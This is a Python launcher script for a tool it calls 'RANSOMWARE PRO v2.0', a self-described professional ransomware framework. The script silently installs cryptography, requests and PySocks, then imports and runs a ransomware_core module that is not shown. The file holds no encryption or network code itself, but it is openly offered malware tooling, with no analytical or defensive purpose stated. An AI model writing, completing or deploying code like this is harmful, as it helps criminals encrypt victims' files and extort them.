#!/usr/bin/env python3
"""
RANSOMWARE PRO - BOOTSTRAP LAUNCHER
====================================
Launcher with automatic dependency installation.
Standalone executable - no pre-installed dependencies required.
"""

import sys
import subprocess
import os

def install_dependencies():
    """Install all required dependencies"""
    print("[*] Checking dependencies...")
    
    dependencies = [
        'cryptography>=41.0.0',
        'requests>=2.31.0',
        'PySocks>=1.7.1'
    ]
    
    for dep in dependencies:
        package_name = dep.split('>=')[0] if '>=' in dep else dep
        print(f"[*] Installing {package_name}...", end=' ')
        
        try:
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', dep],
                capture_output=True,
                timeout=60
            )
            
            if result.returncode == 0:
                print("✓")
            else:
                print("✗")
                print(f"[!] Error: {result.stderr.decode()}")
        except Exception as e:
            print(f"✗ - {e}")

def main():
    """Main launcher"""
    print("╔═══════════════════════════════════════════╗")
    print("║  RANSOMWARE PRO v2.0 - LAUNCHER           ║")
    print("║  Professional Ransomware Framework        ║")
    print("╚═══════════════════════════════════════════╝\n")
    
    # Auto-install dependencies
    install_dependencies()
    
    print("\n[+] All dependencies ready!")
    print("[+] Launching ransomware_core.py...\n")
    
    # Launch main ransomware
    try:
        import ransomware_core
        ransomware = ransomware_core.RansomwareCore()
        ransomware.run()
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
